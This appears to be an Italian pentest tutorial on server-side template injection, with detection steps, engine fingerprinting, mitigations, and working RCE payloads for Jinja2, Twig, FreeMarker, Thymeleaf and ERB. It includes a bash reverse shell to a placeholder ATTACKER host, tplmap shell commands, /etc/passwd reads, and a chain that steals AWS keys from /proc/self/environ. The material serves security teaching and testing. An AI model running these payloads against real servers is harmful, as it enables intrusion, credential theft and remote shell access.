---
title: 'SSTI (Server-Side Template Injection): Detection, Payload, Twig, Jinja2 e RCE'
slug: ssti
description: 'Guida pratica alla SSTI: detection, fingerprint del template engine, payload reali, Jinja2, Twig, FreeMarker, sandbox bypass e RCE.'
image: /ssti.webp
draft: false
date: 2026-03-15T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - ssti
  - injection-attacks
featured: true
---

I template engine sono ovunque nelle applicazioni moderne: [Jinja2](https://hackita.it/articoli/jinja2-ssti-rce) per Flask/Django, [Twig](https://hackita.it/articoli/twig-ssti-rce) per Symfony/Laravel, [FreeMarker](https://hackita.it/articoli/freemarker-ssti-rce) per Spring Boot, [Thymeleaf](https://hackita.it/articoli/thymeleaf-ssti-rce) per applicazioni Java, [ERB](https://hackita.it/articoli/erb-ssti-rce) per Ruby on Rails, [Velocity](https://hackita.it/articoli/velocity-ssti-rce) in ambienti enterprise. Il problema nasce quando lo sviluppatore inserisce l'input dell'utente **dentro il template** invece di passarlo come variabile.

La **Server-Side Template Injection** (SSTI) è una vulnerabilità server-side che porta a **RCE completa** nella maggior parte dei casi — accesso diretto al sistema operativo, filesystem e credenziali dell'applicazione. Non è paragonabile alla XSS: non colpisce il browser della vittima, colpisce il server.

Questa guida copre **tutti i principali engine** — Jinja2, Twig, FreeMarker, Thymeleaf, ERB, Velocity — con detection, fingerprint, payload reali e sandbox bypass. Satellite operativo della [guida pillar Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa). Vedi anche: [XSS](https://hackita.it/articoli/xss/), [SQL Injection](https://hackita.it/articoli/sqlmap/), [XPath Injection](https://hackita.it/articoli/xpath-injection/).

***

## Cos'è la Server-Side Template Injection

### Differenza tra SSTI e XSS

La [XSS](https://hackita.it/articoli/xss/) è client-side: il payload viene eseguito nel browser della vittima. La SSTI è server-side: il payload viene eseguito sul server, con accesso diretto al sistema operativo, al filesystem e alle credenziali dell'applicazione. L'impatto non è comparabile — la SSTI porta a **RCE completa** nella maggior parte dei casi.

### Perché una SSTI può portare a RCE

I template engine moderni hanno accesso al runtime del linguaggio sottostante (Python, Java, PHP, Ruby). L'attaccante sfrutta questo accesso per risalire dall'oggetto stringa alla classe `os` (Python) o a `Runtime` (Java), eseguendo comandi arbitrari sul sistema.

***

## Come nasce una SSTI nel codice

### User input concatenato nel template

Il pattern vulnerabile più comune in Python/Flask:

```python
# VULNERABILE
@app.route('/hello')
def hello():
    name = request.args.get('name')
    return render_template_string(f"<h1>Ciao {name}</h1>")

# SICURO
@app.route('/hello')
def hello():
    name = request.args.get('name')
    return render_template("hello.html", name=name)
```

Nel primo caso l'input viene concatenato nella stringa del template prima del rendering. Nel secondo viene passato come variabile — il template engine lo tratta come dato, non come codice.

### Template context vs data context

Il template engine distingue due contesti:

* **Code context**: tutto quello che è dentro i delimitatori del template (`{{"{{"}}...{{"}}"}}`, `${...}`, `<%= ... %>`) — viene eseguito.
* **Data context**: variabili passate al template con il meccanismo corretto — vengono escaped e trattate come testo.

La SSTI avviene quando l'input utente finisce nel code context.

### Dove si trova davvero nelle web app

* Funzioni di anteprima/preview (messaggi regalo, email personalizzate)
* Generatori di PDF con template editabili
* CMS con template modificabili dall'utente
* Microservizi di notifica che accettano template via API
* Report dinamici con campi personalizzabili

***

## Come rilevare una SSTI

### Quick fingerprint — payload di conferma per engine

Una sola tabella, usala come riferimento rapido. Nelle sezioni successive trovi solo i payload specifici per ogni engine.

| Engine                                                        | Linguaggio | Payload conferma      | Output atteso                                  |
| ------------------------------------------------------------- | ---------- | --------------------- | ---------------------------------------------- |
| [Jinja2](https://hackita.it/articoli/jinja2-ssti-rce)         | Python     | `{{"{{"}}7*7{{"}}"}}` | `49`                                           |
| [Twig](https://hackita.it/articoli/twig-ssti-rce)             | PHP        | `{{"{{"}}7*7{{"}}"}}` | `49`                                           |
| [FreeMarker](https://hackita.it/articoli/freemarker-ssti-rce) | Java       | `${7*7}`              | `49`                                           |
| [Thymeleaf](https://hackita.it/articoli/thymeleaf-ssti-rce)   | Java       | `[[${7*7}]]`          | `49`                                           |
| [ERB](https://hackita.it/articoli/erb-ssti-rce)               | Ruby       | `<%= 7*7 %>`          | `49`                                           |
| [Velocity](https://hackita.it/articoli/velocity-ssti-rce)     | Java       | `${7*7}`              | `49` (se il var non è definito, niente output) |

**Segnali rapidi che fanno sospettare una SSTI:** campo di input che riflette il testo con qualcosa di strano (testo mancante, errore parziale) — errori verbose con stack trace che menzionano `jinja2`, `twig`, `freemarker`, `thymeleaf` — risposta di dimensione diversa rispetto a input normale — funzionalità "preview" o "anteprima" che renderizza HTML dinamico — API che accettano un campo `template` o `body` in JSON.

### Error-based detection

Gli errori dei template engine sono spesso verbose e rivelano il tipo di engine:

* `TemplateSyntaxError` / `UndefinedError` → Jinja2
* `Twig_Error_Syntax` → Twig
* `freemarker.core.ParseException` → Freemarker
* `org.thymeleaf.exceptions` → Thymeleaf

### Detection manuale con Burp Suite

Con [Burp Suite](https://hackita.it/articoli/burp-suite/) intercetti la richiesta e testi i payload manualmente nel Repeater, oppure automatizzi con l'Intruder caricando una wordlist di payload SSTI. Attiva sempre il "Show response in browser" per vedere il rendering completo.

**Cosa guardare in Burp in 60 secondi:** intercetta la request con il parametro sospetto e mandala al Repeater. Modifica il valore con un payload dalla tabella Quick fingerprint — se la response contiene `49` la SSTI è confermata. Se compare un errore con stack trace, leggi il nome dell'engine nell'errore. Usa [OWASP ZAP](https://hackita.it/articoli/owasp-zap/) per lo spider automatico e l'active scan su tutti gli endpoint.

***

## Come identificare il template engine

### Mappa di identificazione

Dopo il polyglot `${{"{{"}}<%[%'"}}%\.`, usa questa mappa per identificare l'engine:

```
{{"{{"}}7*'7'{{"}}"}} → 7777777 = Jinja2 | 49 = Twig
${7?upper_case}       → errore = FreeMarker | niente = Velocity
[[${7*7}]]            → 49 = Thymeleaf
<%= 7*7 %>            → 49 = ERB
```

### Fingerprint Jinja2

```
{{"{{"}}7*'7'{{"}}"}}      → 7777777 (moltiplica stringhe — unico tra gli engine)
{{"{{"}}config{{"}}"}}     → mostra configurazione Flask
```

Guida completa: [Jinja2 SSTI to RCE](https://hackita.it/articoli/jinja2-ssti-rce)

### Fingerprint Twig

```
{{"{{"}}7*'7'{{"}}"}}      → 49 (non moltiplica stringhe — differenza chiave da Jinja2)
{{"{{"}}_self{{"}}"}}      → mostra info Twig
```

Guida completa: [Twig SSTI e sandbox bypass](https://hackita.it/articoli/twig-ssti-rce)

### Fingerprint FreeMarker

```
${7?upper_case}  → errore (non è una stringa → FreeMarker confermato)
```

Guida completa: [FreeMarker SSTI](https://hackita.it/articoli/freemarker-ssti-rce)

### Fingerprint Thymeleaf

```
[[${7*7}]]       → 49
```

Guida completa: [Thymeleaf SSTI](https://hackita.it/articoli/thymeleaf-ssti-rce)

***

## Approfondimenti per engine

Guide satellite dedicate — ogni pagina tratta un engine in dettaglio e rimanda a questo pillar e alla [guida Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa):

* [Jinja2 SSTI to RCE](https://hackita.it/articoli/jinja2-ssti-rce) — traversal MRO, bypass filtri, reverse shell
* [Twig SSTI e sandbox bypass](https://hackita.it/articoli/twig-ssti-rce) — versioni, sandbox mode, CMS ecosystem
* [FreeMarker SSTI in Java](https://hackita.it/articoli/freemarker-ssti-rce) — Execute utility, Runtime, Spring Boot
* [Thymeleaf SSTI](https://hackita.it/articoli/thymeleaf-ssti-rce) — Spring MVC, expression language
* [ERB SSTI in Ruby](https://hackita.it/articoli/erb-ssti-rce) — Rails, Sinatra, file read e RCE
* [Velocity SSTI](https://hackita.it/articoli/velocity-ssti-rce) — ambienti Java enterprise, chain di exploitation

***

## SSTI payload base

I payload di conferma aritmetica sono nella tabella Quick fingerprint sopra. Qui trovi i payload operativi per ogni fase.

### Payload di introspection

```python
# Jinja2 — leggi configurazione Flask
{{"{{"}}config{{"}}"}}
{{"{{"}}config.SECRET_KEY{{"}}"}}

# Jinja2 — traversal classi Python
{{"{{"}}''.__class__.__mro__{{"}}"}}
{{"{{"}}''.__class__.__mro__[1].__subclasses__(){{"}}"}}
```

### Payload di file read

```python
# Jinja2
{{"{{"}}config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read(){{"}}"}}

# FreeMarker
<#assign file=object.class.forName("java.io.File")>
${file.getConstructor(String).newInstance("/etc/passwd")}

# ERB
<%= File.read('/etc/passwd') %>
```

### Payload di command execution

```python
# Jinja2 — via os.popen
{{"{{"}}config.__class__.__init__.__globals__['os'].popen('id').read(){{"}}"}}

# Twig < 3.x
{{"{{"}}  _self.env.registerUndefinedFilterCallback("exec")  {{"}}"}}{{"{{"}}  _self.env.getFilter("id")  {{"}}"}}

# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}

# ERB
<%= system("id") %>
```

***

## Jinja2 SSTI a fondo

Jinja2 è il template engine più comune nelle applicazioni Python. L'exploitation si basa sul **traversal della gerarchia di classi Python** (Method Resolution Order — MRO) per raggiungere moduli come `os` o `subprocess`.

### Object traversal

```python
# Parti da una stringa vuota e risali alla classe base object
{{"{{"}}''.__class__{{"}}"}}
# → <class 'str'>

{{"{{"}}''.__class__.__mro__{{"}}"}}
# → (<class 'str'>, <class 'object'>)

{{"{{"}}''.__class__.__mro__[1].__subclasses__(){{"}}"}}
# → lista di TUTTE le classi Python caricate in memoria
```

### Accesso a classi e sottoclassi

Una volta ottenuta la lista delle sottoclassi, cerca `subprocess.Popen` (solitamente tra l'indice 250 e 400 a seconda dell'ambiente):

```python
# Trova l'indice di subprocess.Popen
{{"{{"}}''.__class__.__mro__[1].__subclasses__()[287]{{"}}"}}
# → <class 'subprocess.Popen'>
```

### Jinja2 SSTI to RCE

```python
# Via subprocess.Popen (sostituisci 287 con l'indice trovato)
{{"{{"}}''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate(){{"}}"}}

# Via config Flask (shortcut più pulito)
{{"{{"}}config.__class__.__init__.__globals__['os'].popen('id').read(){{"}}"}}

# Via request (Flask)
{{"{{"}}request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read(){{"}}"}}

# Reverse shell
{{"{{"}}config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"').read(){{"}}"}}
```

### Jinja2 sandbox bypass

Se `_` è filtrato (il filtro più comune perché blocca `__class__`, `__mro__`, `__subclasses__`):

```python
# Via hex encoding degli underscore
{{"{{"}}''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f'){{"}}"}}

# Via format string per costruire "__class__"
{{'%c%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115,95,95)}}

# Via request (bypassa il filtro su _)
{{"{{"}}request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f'){{"}}"}}
```

Se `.` è filtrato:

```python
# Via attr filter
{{"{{"}}''|attr('__class__')|attr('__mro__'){{"}}"}}

# Via bracket notation
{{"{{"}}''['__class__']['__mro__']{{"}}"}}
```

***

## Twig, Freemarker e Thymeleaf

### Twig exploitation (PHP — Symfony, Laravel)

Twig è il template engine più diffuso nell'ecosistema PHP, presente in Symfony, Laravel, Drupal e molti CMS. Ha un sistema di **sandbox mode** che, quando abilitato, limita tag, filtri, metodi e proprietà accessibili — ma **è disabilitato per default**. Quando la sandbox non è configurata, l'exploitation è diretta. Anche con sandbox attiva, la configurazione concreta degli oggetti esposti dall'applicazione cambia l'impatto reale.

> **Nota versione/configurazione**: il comportamento di Twig varia significativamente tra versioni. Twig ha pubblicato advisory di sicurezza nel 2024, inclusi potenziali bypass della sandbox. Verifica sempre la versione in uso e la configurazione specifica dell'applicazione prima di assumere che un engine sia "sicuro".

```php
# Fingerprint preciso (differenzia da Jinja2)
{{"{{"}}7*'7'{{"}}"}}          → 49 (non moltiplica stringhe — Jinja2 darebbe 7777777)
{{"{{"}}_self{{"}}"}}          → mostra info Twig
{{"{{"}}_self.env{{"}}"}}      → oggetto Environment Twig
{{"{{"}}_self.templateName{{"}}"}} → nome del template corrente

# RCE Twig < 3.x (senza sandbox)
{{"{{"}}  _self.env.registerUndefinedFilterCallback("exec")  {{"}}"}}
{{"{{"}}  _self.env.getFilter("id")  {{"}}"}}

# RCE Twig 3.x (senza sandbox)
{{"{{"}}['id']|filter('system'){{"}}"}}

# File read (se disponibile)
{{"{{"}}'/etc/passwd'|file_excerpt(0,100){{"}}"}}
```

**Twig in CMS e plugin**: Twig è molto usato in Drupal, Craft CMS, Statamic e plugin WordPress. In questi contesti l'applicazione spesso espone oggetti con metodi interessanti — analizza sempre quali oggetti sono nel contesto del template prima di usare payload generici.

**Con sandbox abilitata**: la sandbox Twig blocca tag/filtri non in whitelist e metodi non autorizzati. Se la sandbox è attiva, cerca callable non sicuri esposti dall'applicazione, oggetti custom con metodi pericolosi, o vulnerabilità specifiche della versione.

### FreeMarker exploitation (Java — Spring Boot)

```java
# RCE via Execute
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}

# RCE via Runtime
<#assign runtime=statics["java.lang.Runtime"].getRuntime()>
${runtime.exec("id")}
```

Guida completa: [FreeMarker SSTI in Java](https://hackita.it/articoli/freemarker-ssti-rce)

### Thymeleaf exploitation (Java — Spring)

```java
# RCE
[[${T(java.lang.Runtime).getRuntime().exec("id")}]]

# RCE con output leggibile
[[${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).valueOf(new char[]{'i','d'})).getInputStream())}]]
```

Guida completa: [Thymeleaf SSTI](https://hackita.it/articoli/thymeleaf-ssti-rce)

### Differenze pratiche tra engine

| Engine     | Linguaggio | Delimitatori              | Sandbox default | Guida                                                                   |
| ---------- | ---------- | ------------------------- | --------------- | ----------------------------------------------------------------------- |
| Jinja2     | Python     | `{{"{{"}}{{"}}"}}` `{%%}` | No              | [Jinja2 SSTI to RCE](https://hackita.it/articoli/jinja2-ssti-rce)       |
| Twig       | PHP        | `{{"{{"}}{{"}}"}}` `{%%}` | Opzionale       | [Twig SSTI e sandbox bypass](https://hackita.it/articoli/twig-ssti-rce) |
| FreeMarker | Java       | `${}` `<#...>`            | No              | [FreeMarker SSTI](https://hackita.it/articoli/freemarker-ssti-rce)      |
| Thymeleaf  | Java       | `[[${...}]]` `th:`        | Parziale        | [Thymeleaf SSTI](https://hackita.it/articoli/thymeleaf-ssti-rce)        |
| ERB        | Ruby       | `<%= %>` `<% %>`          | No              | [ERB SSTI](https://hackita.it/articoli/erb-ssti-rce)                    |
| Velocity   | Java       | `${}` `#set`              | No              | [Velocity SSTI](https://hackita.it/articoli/velocity-ssti-rce)          |

***

## Tool utili

### Burp Repeater e Intruder

Con [Burp Suite](https://hackita.it/articoli/burp-suite/) intercetti la richiesta e testi i payload manualmente nel Repeater. Per automazione usa l'Intruder con una wordlist di payload SSTI — trovi una lista completa su PayloadsAllTheThings su GitHub.

### tplmap

Tool dedicato alla detection e exploitation automatica della SSTI:

```bash
# Detection e exploitation automatica
tplmap -u "https://target.com/page?name=test"

# Con POST data
tplmap -u "https://target.com/api" -d "name=test"

# Shell interattiva
tplmap -u "URL" --os-shell

# Comando singolo
tplmap -u "URL" --os-cmd "id"

# Reverse shell
tplmap -u "URL" --reverse-shell ATTACKER 4444
```

### OWASP ZAP

Con [OWASP ZAP](https://hackita.it/articoli/owasp-zap/) puoi usare lo spider per mappare tutti i parametri dell'applicazione e l'active scan per testare automaticamente la SSTI su ogni endpoint trovato.

### Fingerprinting stack

Prima di testare la SSTI conviene sapere quale linguaggio e framework usa l'applicazione. Usa [Wappalyzer](https://hackita.it/articoli/wappalyzer/) per il fingerprinting via browser, o [WhatWeb](https://hackita.it/articoli/whatweb/) da CLI per analizzare header HTTP (`X-Powered-By`, `Server`, cookie di sessione) e restringere il campo dei template engine plausibili. Flask → Jinja2. Symfony/Laravel → Twig. Spring Boot → FreeMarker o Thymeleaf.

***

## Casi reali e CVE

### CVE-2025-23211 — Tandoor Recipes (Jinja2)

OffSec ha documentato una Jinja2 SSTI to RCE su Tandoor Recipes, applicazione Python per la gestione di ricette. La vulnerabilità permetteva command execution tramite input non sanificato passato a `render_template_string()`. Fix rilasciato nella versione 1.5.24. Il pattern è quello classico: sviluppatore usa `render_template_string()` con variabile utente non sanificata pensando sia sicuro.

### Check Point Research 2024

Check Point Research ha pubblicato nel 2024 un'analisi dedicata alla SSTI che mostra come la vulnerabilità continui a colpire applicazioni enterprise moderne. Il report evidenzia che i microservizi che generano documenti dinamici (email, PDF, notifiche) sono la superficie più comune nel 2024-2026.

### Perché la SSTI è ancora attuale

La superficie di attacco per la SSTI è in crescita — i microservizi che generano email, notifiche push, PDF e report personalizzati creano continuamente nuovi punti di ingresso. Nel 2026 la trovi spesso nelle API:

```json
POST /api/v2/notifications/send
{
  "template": "welcome",
  "variables": {"name": "{{"{{"}}config.SECRET_KEY{{"}}"}}"}
}
```

***

## SSTI in base al contesto applicativo

La SSTI si trova in contesti molto diversi — il template engine cambia, ma il pattern vulnerabile è sempre lo stesso: input utente dentro il codice del template.

**Email template personalizzate**: microservizi di notifica che accettano variabili utente nel corpo dell'email. Se il campo `name` o `subject` finisce dentro un template Jinja2/Twig senza sanitizzazione, è SSTI.

**CMS con template editabili**: Drupal, Craft CMS, Statamic e plugin WordPress permettono spesso agli admin di modificare i template. Un admin compromesso o un insider può iniettare SSTI. In questo contesto Twig è il target più comune.

**Generatori di PDF**: librerie come WeasyPrint, wkhtmltopdf e Puppeteer usano spesso template per generare documenti dinamici. Se l'utente controlla una parte del template, l'impatto è RCE sul server che genera il PDF.

**Funzioni preview/anteprima**: le funzioni di anteprima usano lo stesso engine del rendering finale. Se accettano SSTI nel preview, l'impatto è reale — "è solo un'anteprima" non è una mitigazione.

**API notification e report**: le API che accettano un campo `template_body` o `content` in JSON sono superfici tipiche nel 2026. OWASP segnala che feature con markup/template fornito dall'utente — CMS, marketing app, review system — sono tra le superfici più esposte.

***

## Dalla SSTI al cloud

La SSTI è particolarmente devastante in ambienti cloud e containerizzati. Le applicazioni Flask/Django su Kubernetes hanno spesso accesso a credenziali AWS o GCP via variabili d'ambiente o service account — e una SSTI le espone direttamente.

```
SSTI su Flask app
→ RCE nel container/pod
→ config.SECRET_KEY → forgia session cookie admin
→ /proc/self/environ → AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY
→ aws s3 ls → data exfiltration
→ oppure: service account Kubernetes → kubectl → cluster admin
```

Tempo reale dalla prima conferma al cloud access: 20-40 minuti. La chain completa è nella guida [Vulnerability Exploitation](https://hackita.it/articoli/vulnerability-exploitation/).

***

## Mitigazioni corrette

### Mai concatenare input nel template

```python
# SBAGLIATO — vulnerabile a SSTI
render_template_string(f"<p>{user_input}</p>")

# CORRETTO — input come variabile
render_template("page.html", content=user_input)
```

### Sandboxing e hardening

Jinja2 ha un `SandboxedEnvironment` che limita l'accesso agli attributi pericolosi. Twig ha un sistema di sandbox configurabile. Non sono soluzioni complete — un attaccante esperto può bypassarli — ma aumentano la difficoltà.

```python
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
env.from_string(template).render(name=user_input)
```

### Template engine sicuri e review del codice

* Gli utenti non devono mai poter modificare i template dell'applicazione
* Revisionare ogni uso di `render_template_string()`, `eval()`, o funzioni equivalenti
* Abilitare l'autoescaping (default in Jinja2 per HTML, verificare la configurazione)
* **Twig sandbox**: va abilitata esplicitamente quando si includono template non fidati — non basta "usare Twig", conta come lo configuri. Definisci una whitelist stretta di tag, filtri, metodi e proprietà. Non esporre callable arbitrari nel contesto del sandbox.
* Principio del minimo privilegio: se il template non ha bisogno di accedere a `config` o `os`, non renderli disponibili nel contesto

***

## Checklist pentest SSTI

### Detection

* Inviare il polyglot `${{"{{"}}<%[%'"}}%\.` su ogni parametro
* Testare i payload dalla tabella Quick fingerprint per ogni engine
* Verificare la risposta: output `49`, errore verbose, o comportamento anomalo
* Testare anche parametri nascosti, header HTTP, cookie

### Engine identification

* Usare la mappa di identificazione nella sezione dedicata
* Analizzare gli errori verbose — spesso rivelano il tipo di engine
* Verificare framework con [Wappalyzer](https://hackita.it/articoli/wappalyzer/) o [WhatWeb](https://hackita.it/articoli/whatweb/)

### Exploitation

* Jinja2: tentare accesso a `config`, poi traversal MRO, poi `os.popen('id')`
* Twig: tentare `_self.env.registerUndefinedFilterCallback("exec")`
* Freemarker: tentare `freemarker.template.utility.Execute`
* Verificare se esistono filtri su `_`, `.`, parentesi — testare bypass

### Reporting

* Documentare il parametro vulnerabile e la request completa
* Allegare proof of concept con `id` o lettura file non sensibile
* Indicare il template engine identificato
* Descrivere l'impatto: RCE, file read, credential leak

***

## FAQ

**Cos'è una SSTI?**
È una vulnerabilità in cui l'input utente viene inserito dentro il codice di un template server-side e interpretato come espressione dal template engine — invece di essere trattato come testo.

**Qual è la differenza tra SSTI e XSS?**
La [XSS](https://hackita.it/articoli/xss/) è client-side: il payload viene eseguito nel browser della vittima. La SSTI è server-side: viene eseguita sul server, con accesso diretto al filesystem, al sistema operativo e alle credenziali. L'impatto è incomparabilmente più grave.

**Come riconosco il template engine?**
Usa la mappa di identificazione nella sezione dedicata: testa `{{"{{"}}7*'7'{{"}}"}}` per distinguere Jinja2 da Twig, `${7?upper_case}` per Freemarker, `[[${7*7}]]` per Thymeleaf. Gli errori verbose spesso rivelano direttamente il nome dell'engine.

**La SSTI porta sempre a RCE?**
Non necessariamente — dipende dalla configurazione, dalla sandbox, dagli oggetti esposti nel contesto e dalla versione dell'engine. In molti casi però l'impatto è RCE o almeno file read e credential leak. Va sempre valutato caso per caso.

**Jinja2 e Twig si exploitano allo stesso modo?**
No. Usano gli stessi delimitatori `{{"{{"}}{{"}}"}}` ma logiche diverse. Jinja2 si basa sul traversal MRO delle classi Python. Twig usa filtri e l'oggetto `_self` per accedere all'environment. I payload non sono intercambiabili.

***

Satellite della [Guida Completa Injection Attacks](https://hackita.it/articoli/injection-attacks-guida-completa). Vedi anche: [XSS](https://hackita.it/articoli/xss/), [SQLMap](https://hackita.it/articoli/sqlmap/), [XPath Injection](https://hackita.it/articoli/xpath-injection/), [Burp Suite](https://hackita.it/articoli/burp-suite/), [OWASP ZAP](https://hackita.it/articoli/owasp-zap/), [Wappalyzer](https://hackita.it/articoli/wappalyzer/), [WhatWeb](https://hackita.it/articoli/whatweb/), [Vulnerability Exploitation](https://hackita.it/articoli/vulnerability-exploitation/).

**Riferimenti esterni**: [PortSwigger Web Security Academy — SSTI](https://portswigger.net/web-security/server-side-template-injection) · [OWASP WSTG — Testing for SSTI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection) · [PortSwigger Research — SSTI](https://portswigger.net/research/server-side-template-injection)

> I tuoi template engine valutano input utente? [Penetration test HackIta](https://hackita.it/servizi). Per padroneggiare la SSTI: [formazione 1:1](https://hackita.it/formazione).
